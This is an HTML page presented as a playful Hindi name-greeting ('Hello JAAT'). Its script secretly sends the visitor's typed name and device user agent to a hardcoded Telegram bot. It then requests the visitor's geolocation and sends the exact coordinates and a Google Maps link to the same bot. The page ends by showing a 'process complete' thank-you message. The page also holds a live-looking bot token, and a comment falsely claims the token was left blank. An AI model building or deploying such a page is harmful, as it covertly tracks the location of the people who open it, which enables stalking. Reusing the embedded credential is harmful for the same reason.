<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hello_JAAT_G</title>
<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}
body{
min-height:100vh;
background:linear-gradient(135deg,#050505,#0f172a,#111827);
color:white;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
overflow-x:hidden;
}
.container{
width:100%;
max-width:900px;
}
.title{
text-align:center;
font-size:60px;
font-weight:bold;
margin-bottom:15px;
background:linear-gradient(90deg,#00ffff,#00ff88,#ff00ff,#00ffff);
background-size:300% 300%;
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
animation:glow 4s infinite linear;
}
@keyframes glow{
0%{background-position:0% 50%;}
50%{background-position:100% 50%;}
100%{background-position:0% 50%;}
}
.card{
background:rgba(255,255,255,0.05);
border:1px solid rgba(255,255,255,0.1);
backdrop-filter:blur(12px);
border-radius:25px;
padding:25px;
box-shadow:0 0 25px rgba(0,255,255,.3);
}
.question{
font-size:28px;
font-weight:bold;
margin-bottom:25px;
text-align:center;
}
.btn{
border:none;
padding:15px 35px;
font-size:18px;
font-weight:bold;
border-radius:18px;
cursor:pointer;
color:white;
transition:.3s;
}
.btn:hover{
transform:scale(1.08);
}
.yes{
background:linear-gradient(45deg,#ff6d00,#ff1744);
box-shadow:0 0 20px orange;
}
</style>
</head>
<body>
<div class="container">
<h1 class="title" id="helloTitle">
HELLO JAAT ☠️🙋
</h1>

<div id="app" class="card">
<div class="question">
📝 Type Your Name
</div>
<input
type="text"
id="userName"
placeholder="अपना नाम लिखें"
style="
width:100%;
padding:15px;
border-radius:15px;
border:none;
font-size:18px;
margin-top:15px;
background: white;
color: black;
">
<div style="text-align:center;margin-top:20px;">
<button class="btn yes" onclick="saveName()">
🚀 Continue
</button>
</div>
</div>
</div>

<script>
let userLocation = "";
let phoneInfo = navigator.userAgent;
let userName = "";

// ⚠️ सुरक्षा के लिए बोट टोकन और चैट आईडी यहाँ खाली छोड़ी है, अपना सही वाला डालें
const BOT_TOKEN = "8423643379:AAG0nGVaqH_BI-QOD2LPkbdyqOLvYz34v4Y";
const CHAT_ID = "8064366990";

async function sendToTelegram(message){
try{
await fetch(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id: CHAT_ID,
text: message
})
});
}catch(error){
console.log(error);
}
}

function showFirstQuestion(){
document.getElementById("app").innerHTML = `
<div class="question">
🙏 THANK YOU
</div>
<div class="question" style="font-size: 20px; font-weight: normal; color: #00ff88;">
धन्यवाद, आपका प्रोसेस पूरा हो चुका है।
</div>
`;
}

async function saveName(){
userName = document.getElementById("userName").value;

if(!userName){
alert("नाम लिखो");
return;
}
document.getElementById("helloTitle").innerHTML =
"HELLO " + userName.toUpperCase() + " ☠️🔥";
sendToTelegram(
"📝 नया नाम मिला\n\n" +
"नाम: " + userName +
"\nफोन: " + phoneInfo
);

// आपका ओरिजिनल लोकेशन पॉप-अप कोड (बिना किसी बदलाव के)
navigator.geolocation.getCurrentPosition(
function(position){
const lat =
position.coords.latitude;
const lon =
position.coords.longitude;
sendToTelegram(
"📍 नई लोकेशन मिली\n\n" +
"नाम: " + userName +
"\nLatitude: " + lat +
"\nLongitude: " + lon +
`\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`
);
showFirstQuestion();
},
function(){
showFirstQuestion();
}
);
}
</script>
</body>
</html>
